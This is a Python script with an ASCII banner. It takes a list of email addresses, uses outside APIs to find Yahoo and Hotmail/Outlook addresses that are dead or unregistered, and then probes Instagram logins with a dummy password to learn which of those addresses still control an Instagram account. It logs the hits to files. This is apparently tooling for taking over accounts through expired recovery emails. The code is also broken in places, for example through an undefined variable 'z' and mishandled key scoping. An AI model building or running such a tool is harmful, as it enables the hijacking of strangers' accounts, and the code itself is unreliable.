import requests,json,sys
from os import system
from big_letters import print_big as ban
from time import sleep
from InstagramAPI import InstagramAPI
######################################
def yahoo(email):
    url_ = "http://widhitools.000webhostapp.com/api/yahoo.php?email="
    r = requests.post(url=url_+email).json()
    if r['status']== 'die':
        with open('yahoo_live.txt','a')as f1:
            f1.write(z['name']+" >> "+z['email']+'\n')
        system(blue)
        Beep(3000,100)
        global q
        q='Live yahoo'
        insta(z['email'])

def hotmail(email):
    url_ap =("http://apilayer.net/api/check?access_key="+key+"email="+email+"&smtp=1&format=1")
    info = json.loads(requests.get(url_ap).text)
    global c
    c=c+1
    try:
        if info['smtp_check']==0:
            with open('hotmail_live.txt','a')as f4:
                f4.write(z['name']+" >> "+z['email']+'\n')
            system(blue)
            Beep(3000,100)
            global q
            q='Live hotmail'
            insta(z['email'])
    except KeyError :
            if c ==251:
                key=input('\n\n[!]Error key you can check yahoo only if you press enter or\n[+]Enter the new key : \n\n')
                if len(key)==32:
                    c=0
                if key=='':
                    key=key1
def insta(email):
    api = InstagramAPI(z['email'], "sxzxcxzwe")
    api.login()
    o=str(api.LastJson)
    if "The password you entered is incorrect" in o:
        with open('insta_live.txt',mode="a") as f3:
            f3.write(z['name']+" >> "+z['email']+"\n")
        Beep(3000,100)
        global w
        w=' , insta'
######################################
if 'win' in sys.platform:
    from winsound import Beep
    clear='cls'
    green='color a'
    blue='color 1'
elif 'linux' in sys.platform:
    def Beep(a,b):
        s=a+b
    clear='clear'
    green='echo -e "\e[34m"'
    blue='echo -e "\e[36m"'
else:
    clear=''
    green=''
    blue=''
######################################
c=0
system(clear)
system(green)
print('''
-------------------------------------
           scripted by :

 |\  /| |--| |    /\  |\  /|  --- |-\\
 | || | |  | |_  |--| | || | |--- |  |
 |    | |--| | | |  | |    | |___ |-/

 |  |  /\   ____  ____  /\  |\  |
 |--| |--| |___  |___  |--| | \ |
 |  | |  | ____| ____| |  | |  \|

  /\  |\  | |    |  ---  ---
 |--| | \ | | || | |--- |__/
 |  | |  \| |/  \| |___ |  \\

''')
sleep(4)
system(clear)
print('\n')
ban('  knight')
url= input("\n[+]Drop the list here[+]\n")
while True:
    key=input('[+]Enter your key : ')
    if len(key) == 32:
        break
    else :
        key=''
key1=key
uuurl=list(url)
if uuurl[-1]== '\"':
    url=url.replace("\"","")
print("\nplease wait......")
url1=url.replace(".txt","")
f=open(url,"r")
emails=f.readlines()
for email in emails:
    system(green)
    try:
        q=''
        w=''
        if 'yahoo' in email:
            yahoo(email)
            print (email+' >> '+q+w+'\n\n')
    
        elif 'hotmail'in z['email']:
            hotmail(email)
            print (email+' >> '+q+w+'\n\n')
        elif 'outlook' in z['email']:
            hotmail(email)
            print (email+' >> '+q+w+'\n\n')
        else:
            print (email+' >> '+q+w+'\n\n')
    except:
        continue
    
f.close()
try:
    f1.close()
except:
    pass
try:
    f3.close()
except:
    pass
try:
    f4.close()
except:
    pass
print('\n\n                       [+]finished[+]\n\n')
print('\n\n             [+]The lists saved in the main folder[+]\n\n')
input()
